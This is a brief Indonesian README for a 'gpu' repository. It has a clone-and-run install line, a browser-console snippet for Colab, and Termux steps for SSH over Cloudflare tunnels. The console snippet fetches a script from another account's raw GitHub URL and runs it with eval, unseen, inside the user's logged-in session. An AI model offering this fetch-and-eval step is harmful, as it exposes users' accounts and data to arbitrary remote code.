# gpu 
<br>
instalasi :
<hr>
git clone https://github.com/Kopen1/gpu && cd gpu && sh start.sh 
<br><br>
<h2> CONSOLE_COLAB <h2>
  <p> akses console : ctrl + shift + k 
    <br>
<hr>
async function mode() { <br>
let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js' <br>
let response = await fetch(url); <br>
let script = await response.text(); <br>
eval(script);} <br>
mode(); <br>
<hr>


	# INSTALASI SSH CLOUDFLARE 
<h2> FOR TERMUX </h2>
=================<br>
pkg upgrade <br>
apt install openssh <br>
=================== <br>
cd ~ <br>
yes "" | pkg update <br>
yes "" | pkg install golang git debianutils make <br>
git clone https://github.com/cloudflare/cloudflared.git --depth=1 <br>
cd cloudflared <br>
sed -i 's/linux/android/g' Makefile <br>
make cloudflared <br>
install cloudflared /data/data/com.termux/files/usr/bin <br>
=================== <br>
nano ~/.ssh/config <br>
=================== <br>
Host *.trycloudflare.com <br>
	HostName %h <br>
	User root <br>
	Port 22 <br>
	ProxyCommand /data/data/com.termux/files/home/cloudflared/cloudflared access ssh --hostname %h <br>



